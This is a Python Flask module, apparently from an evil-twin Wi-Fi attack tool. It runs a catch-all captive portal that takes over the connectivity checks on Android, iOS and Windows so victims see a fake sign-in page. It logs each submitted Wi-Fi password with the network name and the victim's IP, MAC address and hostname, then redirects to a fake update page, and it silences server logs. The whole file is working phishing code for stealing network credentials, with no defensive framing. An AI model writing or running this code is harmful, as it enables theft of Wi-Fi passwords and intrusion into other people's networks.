"""
Captive portal controller.
Flask web server that:
  - Serves the password-capture page for ALL requests (catch-all)
  - Forces DNS-based captive-portal detection to trigger on phones/laptops:
      Android checks connectivitycheck.gstatic.com  → we return our HTML → notification
      iOS checks captive.apple.com                  → same
      Windows checks msftconnecttest.com            → same
  - Accepts POST /submit, logs the credential, redirects to /update
  - Resolves MAC from dnsmasq lease file; falls back to ARP

Route ordering matters:
  /submit and /update are registered first so Flask's router always
  prefers them over the catch-all variable rule /<path:path>.
"""

import logging
import os
import re
import socket
import subprocess
import threading
from datetime import datetime

from flask import Flask, redirect, render_template, request
from werkzeug.serving import WSGIRequestHandler

from config.settings import DHCP_LEASE_FILE, PORTAL_PORT, PORTAL_TEMPLATE_DIR
from models.credentials import Credential, CredentialStore


class _QuietHandler(WSGIRequestHandler):
    """Suppress all werkzeug access and error logs.

    Clients hitting port 443 get redirected to port 80 via iptables REDIRECT.
    Their TLS ClientHello binary data lands on the plain-HTTP Flask server,
    which rejects it with '400 Bad request version' — harmless but very noisy.
    We capture credentials ourselves, so we don't need Flask's access log.
    """

    def log_request(self, code='-', size='-') -> None:
        pass

    def log_error(self, fmt, *args) -> None:
        pass


class PortalController:
    def __init__(self, store: CredentialStore):
        self.store = store
        self._ssid = ''
        self._app = self._build_app()
        self._thread: threading.Thread | None = None

    def set_ssid(self, ssid: str) -> None:
        self._ssid = ssid

    def start(self) -> None:
        self._thread = threading.Thread(
            target=self._run_server,
            daemon=True,
            name='portal-server',
        )
        self._thread.start()

    def stop(self) -> None:
        pass  # daemon thread exits with the main process

    # ------------------------------------------------------------------ #

    def _run_server(self) -> None:
        logging.getLogger('werkzeug').setLevel(logging.CRITICAL)
        self._app.run(
            host='0.0.0.0',
            port=PORTAL_PORT,
            debug=False,
            use_reloader=False,
            threaded=True,
            request_handler=_QuietHandler,
        )

    def _build_app(self) -> Flask:
        app = Flask(__name__, template_folder=PORTAL_TEMPLATE_DIR)
        app.secret_key = os.urandom(24)

        # Specific routes registered first — they always win over the catch-all.

        @app.route('/submit', methods=['POST'])
        def submit():
            password = request.form.get('password', '').strip()
            ip = request.remote_addr
            mac = _mac_from_leases(ip)
            hostname = _hostname(ip)
            cred = Credential(
                timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                ssid=self._ssid,
                password=password,
                ip=ip,
                mac=mac,
                hostname=hostname,
            )
            self.store.add(cred)
            return redirect('/update')

        @app.route('/update')
        def update():
            return render_template('update.html')

        @app.route('/')
        def index():
            return render_template('index.html')

        # Catch-all: any other URL → serve the portal page.
        # This is what triggers captive-portal detection:
        # the device expects a specific response (204, plain text, etc.)
        # but gets our HTML instead, so the OS shows "Sign in to network".
        @app.route('/<path:path>', methods=['GET', 'POST'])
        def catch_all(path):
            return render_template('index.html')

        return app


# ------------------------------------------------------------------ #
# Helpers


def _mac_from_leases(ip: str) -> str:
    try:
        with open(DHCP_LEASE_FILE) as f:
            for line in f:
                # dnsmasq lease format: epoch  mac  ip  hostname  client-id
                parts = line.split()
                if len(parts) >= 3 and parts[2] == ip:
                    return parts[1]
    except FileNotFoundError:
        pass
    return _mac_from_arp(ip)


def _mac_from_arp(ip: str) -> str:
    try:
        out = subprocess.run(
            ['arp', '-n', ip], capture_output=True, text=True, timeout=3,
        ).stdout
        for line in out.splitlines():
            if ip in line:
                m = re.search(r'([0-9a-f]{2}(?::[0-9a-f]{2}){5})', line, re.I)
                if m:
                    return m.group(1)
    except Exception:
        pass
    return 'unknown'


def _hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return 'unknown'
